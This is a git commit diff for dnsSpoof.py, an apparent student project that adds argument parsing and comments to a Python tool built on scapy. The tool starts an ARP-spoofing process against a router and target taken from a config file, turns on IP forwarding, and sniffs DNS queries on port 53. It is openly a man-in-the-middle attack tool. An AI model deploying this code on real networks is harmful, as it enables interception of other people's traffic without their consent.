473801fec8f6db1bab93da4211206a7e87f4a501
Callum Styan <callumstyan@gmail.com>
2015-10-29 13:08:50 -0700

    update git ignore, add argparsing, get rid of execute permissions

--- dnsSpoof.py
+++ dnsSpoof.py
@@ -1,17 +1,19 @@
 #!/usr/bin/python
 
-import ConfigParser, os, platform, sys, signal, multiprocessing, logging
+import ConfigParser, os, platform, sys, signal, multiprocessing, logging, argparse
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS, DNSQR
 import arpSpoof
 
+# get the operating system once
 operatingSystem = platform.system()
 
+# map a section of the config file into a dictionary
 def configSectionMap(section):
     dict = {}
     config = ConfigParser.ConfigParser()
-    config.read('arp.config')
+    config.read(args.configFile)
     options = config.options(section)
     for option in options:
         try:
@@ -23,22 +25,26 @@ def configSectionMap(section):
             dict[option] = None
     return dict
 
+# signal handler that is called for ctrl + c
 def signalHandler(signal, frame):
     default()
     sys.exit(0)
 
+# set IP forwarding on the spoofing machine
 def forward():
     if operatingSystem == 'Darwin':
         os.system('sysctl -w net.inet.ip.forwarding=1')
     elif operatingSystem == 'Linux':
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
+# unset IP forwarding
 def default():
     if operatingSystem == 'Darwin':
         os.system('sysctl -w net.inet.ip.forwarding=0')
     elif operatingSystem == 'Linux':
         os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 
+# packet parsing for packets that match our scapy filter
 def parse(packet):
     if packet.haslayer(DNS):
         if packet.qdcount > 0 and isinstance(packet.qd, DNSQR):
@@ -47,8 +53,9 @@ def parse(packet):
             name = packet.an.rdata
         print name
 
-
+# main function
 def main():
+    print "main function"
     variables = configSectionMap('ARP')
     arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof, args = (variables['routerip']
                                                                    , variables['routermac']
@@ -60,7 +67,16 @@ def main():
     sniff(filter = 'udp and port 53', prn=parse)
     signal.pause()
     arpProcess.terminate()
-    
 
-if __name__ == '__main__':
-    main()
+# parse arguments
+# argument parsing
+parser = argparse.ArgumentParser(description="Simple DNS Spoofer.")
+parser.add_argument('-c'
+                   , '--config'
+                   , dest='configFile'
+                   , help='path to config file'
+                   , required=True)
+args = parser.parse_args()
+
+# start of main execution
+main()
